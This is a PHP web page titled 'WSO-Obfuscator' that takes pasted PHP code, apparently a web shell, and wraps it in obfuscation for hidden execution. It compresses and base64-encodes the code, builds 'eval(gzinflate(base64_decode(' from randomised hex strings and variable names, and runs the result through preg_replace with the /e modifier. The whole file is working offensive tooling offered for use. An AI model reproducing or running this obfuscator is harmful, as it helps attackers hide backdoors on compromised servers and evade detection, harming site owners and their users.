<?php
function gen_obfuscated_str($string, $letters, $varname){
    $length = strlen($string);
        for ($i=0; $i < $length; $i++){
            if (rand(0,1) == 0){
                $pos = strpos($letters, $string[$i]);
            } else {
                $pos = strrpos($letters, $string[$i]);
            }
            $result.= "\$".$varname."[".$pos."]";
            if($i != $length-1){
                $result.=".";
            }
        }
    return $result;
}

function gen_obf_hex($array){
    $str_result="\"";
    foreach ($array as $h){
            $method = rand (0,5);
            switch($method){
                case 0: $str_result.=$h; break;
                case 1: $str_result.=strtolower($h); break;
                case 2: 
                case 3:    $hex = substr($h, 2,2);
                        $str_result.=chr(hexdec($hex));
                        break;
                case 4:
                case 5:    $hex = substr($h, 2,2);
                        $str_result.="\".chr(".hexdec($hex).").\"";
                        break;
        }
    }
    return $str_result."\"";
}
 
function gen_variable_name($letters){
    $result = substr(str_shuffle($letters),0,rand(1,7));
    return $result.rand(1,9999);
}
 
if ($_SERVER['REQUEST_METHOD']=='POST'){
    $content = $_POST['content']."<?php echo \"ONI NIHUYA NE ZDELAYUD!!!111";
    $content = base64_encode(gzdeflate($content,9));
    $symbols=str_shuffle("qwertyuiopasdfghjklzxcvbnm_1234567890*./)(;");
    $letters="QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
    
    //   eval(gzinflate(base64_decode(
    $hexeval = array ("\\x65","\\x76","\\x61","\\x6C","\\x28","\\x67","\\x7A","\\x69","\\x6E","\\x66","\\x6C","\\x61","\\x74","\\x65","\\x28","\\x62","\\x61","\\x73","\\x65","\\x36","\\x34","\\x5F","\\x64","\\x65","\\x63","\\x6F","\\x64","\\x65","\\x28",);
 
    //   )));
    $hexevalend = array("\\x29","\\x29","\\x29","\\x3B");
    
    for($i=0;$i<5;$var_array[]=gen_variable_name($letters),$i++);
 
    $start_eval = gen_obf_hex($hexeval);
    $end_eval = gen_obf_hex($hexevalend);
    $func = gen_obfuscated_str("preg_replace", $symbols,$var_array[0]);
    $func2 = gen_obfuscated_str("/.*/e", $symbols,$var_array[0]);
 
    $result_source = "<?Ñ€hp ";
    $result_source .= "\$".$var_array[0]." = \"".$symbols."\";";
    $result_source .= "\$".$var_array[1]." = ".$func.";";
    $result_source .= "\$".$var_array[2]." = ".$start_eval.";";
    $result_source .= "\$".$var_array[3]." = ".$end_eval.";";
    $result_source .= "\$".$var_array[4]." = \$".$var_array[2].".\"'".$content."'\".\$".$var_array[3].";";
    $result_source .= "\$".$var_array[1].""."(".$func2.", \$".$var_array[4]."  ,\"".rand(100,999)."\");";
} else{
    $result_source='';
}
?>
<html>
<head><title>WSO-Obfuscator</title></head>
<style>
body {
    background:url('http://krober.biz/wp-content/uploads/2014/11/bg2.png');
    font-family:Verdana, sans-serif;
}
textarea{
    font-family:"Lucida Console", sans-serif;
    font-size: 12px;
    border:4px solid #000;
    border-radius-left: 15px;
}
input{
    border:4px solid #000;
    font-family:"Lucida Console", sans-serif;
    font-size: 27px;
}
</style>
<body>
<form method="post"><center>
<h2>...:::  E1337 PR1V8 0bf s0f7  :::...</h2>
<textarea name="content" rows="30" cols="100">
<?=$result_source;?>
</textarea><br><br>
<input type="submit" value=">>|>> 08FUSK8 <<|<<">
</form>
</body>
</html>
